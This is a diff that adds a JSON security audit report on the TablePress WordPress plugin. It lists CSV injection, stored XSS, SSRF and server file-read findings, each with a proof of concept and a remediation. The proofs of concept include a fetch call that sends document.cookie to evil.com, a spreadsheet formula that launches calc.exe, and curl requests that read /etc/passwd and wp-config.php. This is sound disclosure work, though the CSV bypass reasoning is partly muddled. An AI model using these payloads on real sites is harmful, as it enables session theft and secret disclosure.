@@ -1,0 +1,98 @@
+{
+  "plugin": "tablepress",
+  "reviewed_at": "2026-06-14",
+  "vulnerabilities": [
+    {
+      "id": "TP-001",
+      "title": "CSV Injection via Incomplete Formula Escaping in Export",
+      "severity": "medium",
+      "type": "csv-injection",
+      "authenticated": true,
+      "description": "The csv_wrap_and_escape() method in class-export.php checks if a cell starts with a dangerous prefix character (=, +, -, @) but only applies the protective ' prefix if the cell also contains a specific function name from a hardcoded allowlist (cmd|, FORFILES|, rundll32, DDE(, IMPORTXML(, IMPORTFEED(, IMPORTHTML(, IMPORTRANGE(, IMPORTDATA(, IMAGE(, HYPERLINK(, WEBSERVICE(). A cell content like '=EXEC(malicious)' starts with '=' (triggering the check) but since 'EXEC' is not in the functions_to_escape list, no protective prefix is prepended. The resulting CSV contains the raw formula '=EXEC(malicious)' which spreadsheet applications (Excel, LibreOffice Calc) will execute when the file is opened. Any user with 'tablepress_export_tables' capability (editors and authors by default) can trigger the export of table data containing injected formulas. The injected content must first be stored in a table by a user with 'tablepress_edit_tables' capability.",
+      "affected_function": "csv_wrap_and_escape",
+      "affected_file": "classes/class-export.php",
+      "proof_of_concept": "1. As an admin/editor, create a table with cell content: =EXEC(cmd|' /C calc.exe'!A0)\n2. Export the table as CSV\n3. Open the CSV in Excel/LibreOffice - the EXEC formula will attempt to execute\n\nAlternatively, bypass with: =SUM(IMPORTHTML(\"http://evil.com/\",\"table\",1))\n(IMPORTHTML is in the list but only catches it inside SUM if SUM isn't in the trigger)\n\nActual bypass example - store in cell: =EXEC(\"malicious.exe\")\n- First char = '=' => triggers active_content_triggers check\n- Checks for 'EXEC' in functions_to_escape => NOT FOUND\n- No escaping applied, CSV contains raw formula =EXEC(\"malicious.exe\")",
+      "cvss_score": 5.4,
+      "remediation": "Replace the allowlist approach with a denylist-independent approach: prepend a single quote (') to ANY cell content that starts with =, +, -, or @ characters, regardless of what follows. This is the recommended prevention per OWASP CSV Injection guidelines. The current approach of checking specific function names is inherently bypassable as new dangerous functions can emerge. Consider: if (in_array($cell_content[0], $active_content_triggers, true)) { $cell_content = \"'\" . $cell_content; }"
+    },
+    {
+      "id": "TP-002",
+      "title": "Stored XSS via Table Cells for Users with unfiltered_html Capability",
+      "severity": "high",
+      "type": "xss",
+      "authenticated": true,
+      "description": "TablePress allows users with the 'unfiltered_html' WordPress capability (administrators by default) to store arbitrary HTML including <script> tags in table cells. The safe_output() method in class-render.php only replaces unencoded ampersands and converts line breaks to <br> tags - it does NOT strip or sanitize HTML tags. When a table is rendered via the [table] shortcode, the stored HTML is output directly to the page without escaping. While non-admin users have wp_kses_post() applied (which strips <script> and event handlers), users with unfiltered_html bypass this sanitization entirely. On WordPress single sites, all administrators have unfiltered_html. On WordPress multisite, only superadmins have this capability by default. The severity is elevated because: (1) table content is cached and served to all visitors including unauthenticated users, (2) the attack vector is persistent/stored, (3) table content is rendered in shortcode context which can appear on any page.",
+      "affected_function": "safe_output",
+      "affected_file": "classes/class-render.php",
+      "proof_of_concept": "# As an administrator:\n# 1. Create or edit a TablePress table\n# 2. In any cell, enter: <script>alert(document.cookie)</script>\n# 3. Save the table\n# 4. The table is stored with the raw script tag (no sanitization for unfiltered_html users)\n# 5. Navigate to any page/post with [table id=N] shortcode\n# 6. The script executes for ALL visitors (authenticated and unauthenticated)\n\n# Verify the safe_output() function does not strip HTML:\n# It only does: preg_replace('/&(?![A-Za-z]{0,4}\\w{2,3};|#[0-9]{2,4};)/', '&amp;', $text)\n# and nl2br() - no HTML stripping at all",
+      "cvss_score": 6.1,
+      "remediation": "While administrator-level XSS is generally accepted in WordPress as a known design decision, consider adding a hook/option to escape HTML in table cells for contexts where unfiltered HTML is undesirable. Add a filter like 'tablepress_escape_html_in_cells' that applies esc_html() when enabled. Document the behavior clearly. For wp_kses_post() users, the current protection is adequate."
+    },
+    {
+      "id": "TP-003",
+      "title": "Stored JavaScript Injection via DataTables Custom Commands",
+      "severity": "high",
+      "type": "xss",
+      "authenticated": true,
+      "description": "The 'datatables_custom_commands' table option allows administrators to store arbitrary JavaScript that is injected directly into the DataTables initialization script on the frontend. In controller-frontend.php, the add_datatables_calls() method builds a JavaScript command: $command = \"{$name} = new DataTable('#{$html_id}',{$parameters});\". The $parameters variable includes $parameters['custom_commands'] which is the raw, unescaped value from $js_options['datatables_custom_commands']. This value is then passed to wp_add_inline_script(), which outputs it in a <script> block visible to all page visitors. While restricted to users without 'unfiltered_html' being cleared (line 125-126 in controller-admin_ajax.php), the custom commands field itself is only protected from untrusted users - users with 'unfiltered_html' (admins) can set arbitrary JS. The JavaScript executes in the context of every visitor's browser when they view a page with that table. This is effectively a stored XSS that persists across caches and affects all site visitors.",
+      "affected_function": "add_datatables_calls",
+      "affected_file": "controllers/controller-frontend.php",
+      "proof_of_concept": "# As an administrator:\n# 1. Edit a TablePress table\n# 2. In table options, set DataTables Custom Commands to:\n#    initComplete: function() { fetch('https://evil.com/?c='+document.cookie); }\n# 3. Save the table\n# 4. Visit any page with [table id=N] shortcode\n# The JS executes immediately when DataTables initializes\n\n# The output in the page source will be:\n# DT_TP['N'] = new DataTable('#tablepress-N',{language:DT_language['en_US'],order:[],orderClasses:false,initComplete: function() { fetch('https://evil.com/?c='+document.cookie); }});\n\ncurl -s 'http://localhost:8880/wp-admin/admin-ajax.php' \\\n  -b 'wordpress_logged_in_HASH=...' \\\n  -d 'action=tablepress_save_table&_ajax_nonce=NONCE&tablepress[id]=1&tablepress[options]={\"datatables_custom_commands\":\"initComplete:function(){alert(1)}\"}...'",
+      "cvss_score": 6.5,
+      "remediation": "Sanitize datatables_custom_commands before including it in inline scripts. Use json_encode() to safely escape the JS object string, or apply wp_json_encode() with JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP flags. Alternatively, store the custom commands in a data attribute and parse them client-side, avoiding direct server-side script injection. Consider restricting this feature to superadmins only."
+    },
+    {
+      "id": "TP-004",
+      "title": "SSRF via URL Import with Incomplete IP Blocklist",
+      "severity": "medium",
+      "type": "other",
+      "authenticated": true,
+      "description": "The URL import feature in class-import.php performs a blocklist check on the resolved IP address before downloading the import file. However, the blocklist only covers specific cloud metadata endpoints (169.254.169.254 for AWS/GCP/Azure, 169.254.170.2 for AWS ECS, 192.0.0.192 for Oracle Cloud, 100.100.100.200 for Alibaba Cloud). Critical addresses are NOT blocked: 127.0.0.1/localhost (loopback), ::1 (IPv6 loopback), 10.0.0.0/8 (RFC1918 private), 172.16.0.0/12 (RFC1918 private), 192.168.0.0/16 (RFC1918 private). WordPress's download_url() uses wp_remote_get() which does NOT block local addresses by default (WP_HTTP_BLOCK_EXTERNAL is undefined by default). A user with 'tablepress_import_tables_url' capability (editors and administrators by default) can import from http://127.0.0.1/secret-endpoint or http://192.168.1.1/admin to probe internal services. The gethostbyname() call is also vulnerable to DNS rebinding attacks and does not handle IPv6 addresses properly.",
+      "affected_function": "run (URL import case)",
+      "affected_file": "classes/class-import.php",
+      "proof_of_concept": "# As an editor or administrator with tablepress_import_tables_url capability:\n# 1. Go to TablePress > Import\n# 2. Select 'Import from URL' source\n# 3. Enter URL: http://127.0.0.1:8080/internal-api/users\n# 4. Submit the import form\n# The server will make a request to the internal service and may return/import the response\n\n# Test with localhost bypass:\ncurl -s -c cookies.txt -b cookies.txt \\\n  -d '_wpnonce=NONCE&import[source]=url&import[url]=http://127.0.0.1/wp-config.php&import[type]=add' \\\n  'http://localhost:8880/wp-admin/admin.php?page=tablepress&action=import'\n\n# IPv6 bypass (if server supports IPv6):\n# http://[::1]/internal-service\n\n# DNS rebinding bypass:\n# Configure DNS to resolve attacker.com -> 127.0.0.1 with short TTL\n# Import from http://attacker.com/malicious-data",
+      "cvss_score": 5.0,
+      "remediation": "Expand the IP blocklist to include all RFC1918 private address ranges, loopback addresses (127.0.0.0/8), link-local (169.254.0.0/16 - already partially covered), IPv6 loopback (::1), and IPv6 private ranges. Use PHP's filter_var() with FILTER_VALIDATE_IP and FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE to reject private/reserved IPs. Also implement DNS rebinding protection by resolving the hostname, checking the IP, and then enforcing the same IP is used for the actual download request (by passing the resolved IP directly)."
+    },
+    {
+      "id": "TP-005",
+      "title": "Arbitrary Server File Read via Import from Server Path",
+      "severity": "low",
+      "type": "other",
+      "authenticated": true,
+      "description": "The 'server' import source in class-import.php allows importing table data from an arbitrary file path on the server. While access is restricted to super admins on multisite or users with 'manage_options' on single sites, the only path validation is: (1) the path must not equal ABSPATH exactly, and (2) the file must be readable. This allows reading any file the web server process can read, including wp-config.php (one directory above webroot), /etc/passwd, private key files in the document root, etc. The file contents are parsed as table data (CSV, JSON, HTML, XLS) but parsing errors simply result in an import failure with the file content potentially exposed in error messages. The ABSPATH check is trivially bypassed with slight path variations (e.g., ABSPATH + '../wp-config.php').",
+      "affected_function": "run (server import case)",
+      "affected_file": "classes/class-import.php",
+      "proof_of_concept": "# As a super admin (multisite) or admin (single site):\n# 1. Go to TablePress > Import > Import from Server\n# 2. Enter path: /var/www/html/../wp-config.php\n#    or: /etc/passwd\n#    or: /var/www/html/wp-config.php\n# 3. Submit - the file is read and parsed as table data\n# If parsing fails, portions may be returned in error messages\n# If it succeeds (e.g. wp-config.php has some CSV-like structure), data is imported\n\ncurl -s -c cookies.txt -b cookies.txt \\\n  -d '_wpnonce=NONCE&import[source]=server&import[server]=/etc/passwd&import[type]=add' \\\n  'http://localhost:8880/wp-admin/admin.php?page=tablepress&action=import'",
+      "cvss_score": 3.8,
+      "remediation": "Restrict the server import path to a specific allowed directory (e.g., the uploads directory or a TablePress-specific import folder). Validate that the resolved real path (using realpath()) starts with an allowed base directory. Reject paths containing '../' traversal sequences. Do not expose file parsing errors in redirect messages."
+    },
+    {
+      "id": "TP-006",
+      "title": "Freemius SDK: Stored XSS in Plugin Update Row (Admin-Only)",
+      "severity": "low",
+      "type": "xss",
+      "authenticated": true,
+      "description": "The bundled Freemius SDK in libraries/freemius/includes/class-fs-plugin-updater.php reads plugin update data from the get_site_transient('update_plugins') site transient and outputs it via echo without proper escaping (line 441: echo $plugin_update_row). The plugin update row HTML is constructed using preg_replace() with data from the transient, which could be modified by another plugin or user with transient write access. However, this requires either a compromised plugin update API or the ability to write to site transients (which requires administrator-level access). This is admin-only and only visible in the WordPress admin plugins list. The taint analysis tool flagged this as high confidence but the actual exploitability requires admin privileges to set malicious transient data, making this low severity.",
+      "affected_function": "in_plugin_update_message",
+      "affected_file": "libraries/freemius/includes/class-fs-plugin-updater.php",
+      "proof_of_concept": "# This requires manipulating the 'update_plugins' site transient\n# An attacker with database write access or admin access could:\n# 1. Set the update_plugins transient to contain XSS in plugin response data\n# 2. When an admin views the plugins list, the XSS fires\n# This is a second-order/stored XSS but requires near-admin privileges to set up\n# Low real-world impact as admins already have arbitrary code execution",
+      "cvss_score": 3.5,
+      "remediation": "Update the Freemius SDK to the latest version which includes escaping fixes. Add esc_html() or wp_kses() to the echo of $plugin_update_row in class-fs-plugin-updater.php."
+    },
+    {
+      "id": "TP-007",
+      "title": "Freemius SDK SQLi False Positive - $wpdb->insert() is Safe",
+      "severity": "info",
+      "type": "sqli",
+      "authenticated": false,
+      "description": "The automated taint analysis (tablepress-sqli-001) flagged a potential SQL injection in libraries/freemius/includes/class-fs-logger.php where $_SERVER['REQUEST_URI'] flows into a $wpdb->insert() call. This is a FALSE POSITIVE. WordPress's $wpdb->insert() method uses parameterized queries internally (it calls $wpdb->prepare() with placeholders), so the user-supplied REQUEST_URI value is properly escaped before being inserted into the database. No SQL injection is present here. The data is stored safely as a log entry.",
+      "affected_function": "write",
+      "affected_file": "libraries/freemius/includes/class-fs-logger.php",
+      "proof_of_concept": "N/A - False positive. $wpdb->insert() parameterizes all values automatically:\n// Internally does: sprintf('INSERT INTO %s (%s) VALUES (%s)', $table, $fields, $formats)\n// With $wpdb->prepare() for safe escaping of all values.",
+      "cvss_score": 0.0,
+      "remediation": "No remediation needed - this is not a vulnerability. The taint analysis tool incorrectly classified $wpdb->insert() as an unsafe sink."
+    }
+  ],
+  "summary": "TablePress 3.3.2 presents a mixed security picture. The most actionable finding is TP-001: an incomplete CSV injection protection that can be bypassed by any table editor with cells containing formulas using function names not in the hardcoded denylist (e.g., =EXEC(), =SHELL(), or any future spreadsheet function). The protection approach is fundamentally flawed - it should prepend a quote to ALL formula-starting cells rather than checking for specific function names. TP-003 and TP-002 represent admin-level stored XSS via DataTables custom commands and unfiltered HTML in cells respectively; while technically valid, these require administrator access which is generally treated as a trust boundary in WordPress. TP-004 (SSRF) is a real concern for sites where editors have the URL import capability and internal services are accessible via localhost or RFC1918 addresses. TP-005 (server file read) is admin-only and lower risk. The Freemius SDK taint analysis findings (TP-006, TP-007) are low severity or false positives. No unauthenticated attack surface was found - all AJAX handlers require authentication and nonce verification. No SQL injection vulnerabilities were found in the plugin's core code (the taint-flagged SQLi is a false positive). The plugin's security posture is reasonable for its functionality, with the CSV injection bypass being the highest-priority fix needed."
+}
